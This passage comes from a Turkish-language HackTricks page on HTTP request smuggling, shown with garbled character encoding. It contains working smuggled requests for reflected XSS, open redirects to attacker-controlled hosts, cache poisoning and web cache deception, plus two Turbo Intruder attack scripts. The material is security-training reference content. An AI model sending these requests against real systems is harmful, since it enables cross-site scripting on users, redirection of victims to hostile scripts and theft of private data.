HTTP Ä°stek KaÃ§Ä±rma, web sayfalarÄ±nÄ± **YansÄ±tÄ±lan XSS**'e karÅŸÄ± savunmasÄ±z hale getiren web sayfalarÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in kullanÄ±labilir ve Ã¶nemli avantajlar sunar:

* Hedef kullanÄ±cÄ±larla etkileÅŸim **gerektirmez**.
* Genellikle ulaÅŸÄ±lamayan istek parÃ§alarÄ±ndaki XSS'in sÃ¶mÃ¼rÃ¼lmesine **izin verir**, Ã¶rneÄŸin HTTP isteÄŸi baÅŸlÄ±klarÄ± gibi.

KullanÄ±cÄ±-AjanÄ± baÅŸlÄ±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla YansÄ±tÄ±lan XSS'e duyarlÄ± bir web sitesinin olduÄŸu senaryolarda, aÅŸaÄŸÄ±daki yÃ¼k, bu zafiyetin nasÄ±l sÃ¶mÃ¼rÃ¼leceÄŸini gÃ¶stermektedir:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Bu yÃ¼k, zafiyeti sÃ¶mÃ¼rmek iÃ§in yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r:

1. `Transfer-Encoding: chunked` baÅŸlÄ±ÄŸÄ± ile baÅŸlayan, gÃ¶rÃ¼nÃ¼ÅŸte tipik bir `POST` isteÄŸi baÅŸlatma, bÃ¶ylece kaÃ§akÃ§Ä±lÄ±ÄŸÄ±n baÅŸlangÄ±cÄ±nÄ± belirtir.
2. Chunked mesaj gÃ¶vdesinin sonunu belirleyen `0` ile devam etme.
3. ArdÄ±ndan, kaÃ§akÃ§Ä±lÄ±k yapÄ±lmÄ±ÅŸ bir `GET` isteÄŸi tanÄ±tÄ±lÄ±r, burada `User-Agent` baÅŸlÄ±ÄŸÄ±na `<script>alert(1)</script>` betiÄŸi enjekte edilir ve sunucu bu sonraki isteÄŸi iÅŸlediÄŸinde XSS tetiklenir.

`User-Agent`'Ä± kaÃ§akÃ§Ä±lÄ±k yoluyla manipÃ¼le ederek, yÃ¼k normal istek kÄ±sÄ±tlamalarÄ±nÄ± atlayarak, Reflected XSS zafiyetini standart olmayan ancak etkili bir ÅŸekilde sÃ¶mÃ¼rÃ¼r.

### Bir site iÃ§i yÃ¶nlendirmeyi aÃ§Ä±k yÃ¶nlendirmeye dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in HTTP isteÄŸi kaÃ§akÃ§Ä±lÄ±ÄŸÄ± kullanma <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### HTTP Ä°steÄŸi KaÃ§akÃ§Ä±lÄ±ÄŸÄ± ile Site Ä°Ã§i YÃ¶nlendirmelerin SÃ¶mÃ¼rÃ¼lmesi <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Uygulamalar genellikle, yÃ¶nlendirme URL'sindeki `Host` baÅŸlÄ±ÄŸÄ±ndan gelen ana bilgisayar adÄ±nÄ± kullanarak bir URL'den baÅŸka bir URL'ye yÃ¶nlendirme yapar. Bu, Apache ve IIS gibi web sunucularÄ±yla yaygÄ±ndÄ±r. Ã–rneÄŸin, bir kesme iÅŸareti olmadan bir klasÃ¶r istendiÄŸinde, iÅŸaretÃ§inin bir kesme iÅŸareti iÃ§erecek ÅŸekilde yÃ¶nlendirilmesi sonucunu verir:
```
GET /home HTTP/1.1
Host: normal-website.com
```
SonuÃ§lar:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Bu davranÄ±ÅŸ, HTTP isteÄŸi kaÃ§Ä±rma kullanÄ±larak kullanÄ±cÄ±larÄ±n harici bir siteye yÃ¶nlendirilmesi iÃ§in manipÃ¼le edilebilir. Ã–rneÄŸin:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Bu kaÃ§ak istek, iÅŸlenen sonraki kullanÄ±cÄ± isteÄŸinin bir saldÄ±rgan tarafÄ±ndan kontrol edilen bir web sitesine yÃ¶nlendirilmesine neden olabilir:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
SonuÃ§lar:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### HTTP Ä°stek KaÃ§Ä±rma Kullanarak Web Ã–nbellek Zehirlenmesi GerÃ§ekleÅŸtirme <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### HTTP Ä°stek KaÃ§Ä±rma Yoluyla Web Ã–nbellek Zehirlenmesi SÃ¶mÃ¼rme <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web Ã¶nbellek zehirlenmesi, genellikle performansÄ± artÄ±rmak amacÄ±yla **Ã¶n uÃ§ altyapÄ±sÄ±nÄ±n iÃ§eriÄŸi Ã¶nbelleÄŸe almasÄ±** durumunda gerÃ§ekleÅŸtirilebilir. Sunucunun yanÄ±tÄ±nÄ± manipÃ¼le ederek, **Ã¶nbelleÄŸi zehirlemek** mÃ¼mkÃ¼ndÃ¼r.

Daha Ã¶nce, sunucu yanÄ±tlarÄ±nÄ±n nasÄ±l deÄŸiÅŸtirilebileceÄŸini ve 404 hatasÄ± dÃ¶ndÃ¼rÃ¼lebileceÄŸini gÃ¶zlemledik (bkz. [Temel Ã–rnekler](./#basic-examples)). Benzer ÅŸekilde, sunucuyu, `/static/include.js` isteÄŸi iÃ§in `/index.html` iÃ§eriÄŸini dÃ¶ndÃ¼rmeye kandÄ±rmak mÃ¼mkÃ¼ndÃ¼r. SonuÃ§ olarak, `/static/include.js` iÃ§eriÄŸi, `/index.html`'in iÃ§eriÄŸiyle Ã¶nbellekte deÄŸiÅŸtirilir ve kullanÄ±cÄ±lara eriÅŸilemez hale gelir, bu da Hizmet Reddi (DoS) saldÄ±rÄ±sÄ±na neden olabilir.

Bu teknik, bir **AÃ§Ä±k YÃ¶nlendirme aÃ§Ä±ÄŸÄ±** keÅŸfedilirse veya bir **aÃ§Ä±k yÃ¶nlendirmeye yÃ¶nlendirme** varsa Ã¶zellikle etkili hale gelir. Bu tÃ¼r zafiyetler, `/static/include.js`'nin Ã¶nbelleÄŸindeki iÃ§eriÄŸi, saldÄ±rganÄ±n kontrolÃ¼ndeki bir betikle deÄŸiÅŸtirmek iÃ§in sÃ¶mÃ¼rÃ¼lebilir ve gÃ¼ncellenmiÅŸ `/static/include.js` isteyen tÃ¼m istemcilere karÅŸÄ± geniÅŸ Ã§apta Bir Site Betik SaldÄ±rÄ±sÄ± (XSS) saldÄ±rÄ±sÄ±nÄ± etkinleÅŸtirir.

AÅŸaÄŸÄ±da, **Ã¶n uÃ§ yÃ¶nlendirmesi ile aÃ§Ä±k yÃ¶nlendirmeyi birleÅŸtirerek Ã¶nbellek zehirlenmesini sÃ¶mÃ¼rme**nin bir Ã¶rneÄŸi verilmiÅŸtir. AmaÃ§, `/static/include.js` Ã¶nbellek iÃ§eriÄŸini saldÄ±rganÄ±n kontrolÃ¼ndeki JavaScript kodunu sunacak ÅŸekilde deÄŸiÅŸtirmektir:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
GÃ¶mÃ¼lÃ¼ isteÄŸi `/post/next?postId=3` hedefleyen isteÄŸi dikkate alÄ±n. Bu istek, alan adÄ±nÄ± belirlemek iÃ§in **Ana Bilgisayar baÅŸlÄ±k deÄŸerini** kullanarak `/post?postId=4`'e yÃ¶nlendirilecektir. **Ana Bilgisayar baÅŸlÄ±ÄŸÄ±nÄ±** deÄŸiÅŸtirerek, saldÄ±rgan isteÄŸi kendi alan adlarÄ±na yÃ¶nlendirebilir (**yerinde yÃ¶nlendirme aÃ§Ä±k yÃ¶nlendirmeye**).

BaÅŸarÄ±lÄ± **soket zehirlenmesi** sonrasÄ±nda `/static/include.js` iÃ§in bir **GET isteÄŸi** baÅŸlatÄ±lmalÄ±dÄ±r. Bu istek, Ã¶nceki **yerinde yÃ¶nlendirme aÃ§Ä±k yÃ¶nlendirmeye** isteÄŸi tarafÄ±ndan kirletilecek ve saldÄ±rgan tarafÄ±ndan kontrol edilen betiÄŸin iÃ§eriÄŸini getirecektir.

ArdÄ±ndan, `/static/include.js` iÃ§in yapÄ±lan herhangi bir istek, saldÄ±rganÄ±n betiÄŸinin Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ iÃ§eriÄŸini sunacak ve etkili bir XSS saldÄ±rÄ±sÄ± baÅŸlatacaktÄ±r.

### Web Ã¶nbellek aldatmacasÄ± gerÃ§ekleÅŸtirmek iÃ§in HTTP isteÄŸi kaÃ§Ä±rma <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Web Ã¶nbellek zehirlenmesi ile web Ã¶nbellek aldatmacasÄ± arasÄ±ndaki fark nedir?**
>
> * **Web Ã¶nbellek zehirlenmesinde**, saldÄ±rgan uygulamanÄ±n Ã¶nbelleÄŸe bazÄ± kÃ¶tÃ¼ amaÃ§lÄ± iÃ§erikler depolamasÄ±na neden olur ve bu iÃ§erik Ã¶nbellekten diÄŸer uygulama kullanÄ±cÄ±larÄ±na sunulur.
> * **Web Ã¶nbellek aldatmacasÄ±nda**, saldÄ±rgan uygulamayÄ± baÅŸka bir kullanÄ±cÄ±ya ait hassas iÃ§erikleri Ã¶nbelleÄŸe almasÄ±na neden olur ve ardÄ±ndan bu iÃ§eriÄŸi Ã¶nbellekten alÄ±r.
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
EÄŸer bu kaÃ§ak istek Ã¶nbelleÄŸi, statik iÃ§erik iÃ§in amaÃ§lanan bir Ã¶nbellek giriÅŸini zehirlerse (Ã¶rneÄŸin, `/someimage.png`), kurbanÄ±n hassas verileri `/private/messages` altÄ±nda statik iÃ§eriÄŸin Ã¶nbellek giriÅŸi altÄ±nda Ã¶nbelleÄŸe alÄ±nabilir. SonuÃ§ olarak, saldÄ±rgan bu Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ hassas verileri potansiyel olarak alabilir.

### HTTP YanÄ±tÄ± Desenkronizasyonu ile HTTP Ä°stek KaÃ§akÃ§Ä±lÄ±ÄŸÄ±nÄ± SilahlandÄ±rma

Bir HTTP Ä°stek KaÃ§akÃ§Ä±lÄ±ÄŸÄ± aÃ§Ä±ÄŸÄ± buldunuz ve nasÄ±l sÃ¶mÃ¼rÃ¼leceÄŸini bilmiyorsanÄ±z, bu baÅŸka bir sÃ¶mÃ¼rÃ¼ yÃ¶ntemini deneyin:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo intruder betikleri

### CL.TE

[https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## AraÃ§lar

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Bu araÃ§, tuhaf istek smugling farklÄ±lÄ±klarÄ±nÄ± bulmak iÃ§in kullanÄ±ÅŸlÄ± olan dil tabanlÄ± bir HTTP Fuzzer'dÄ±r.

## Referanslar

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
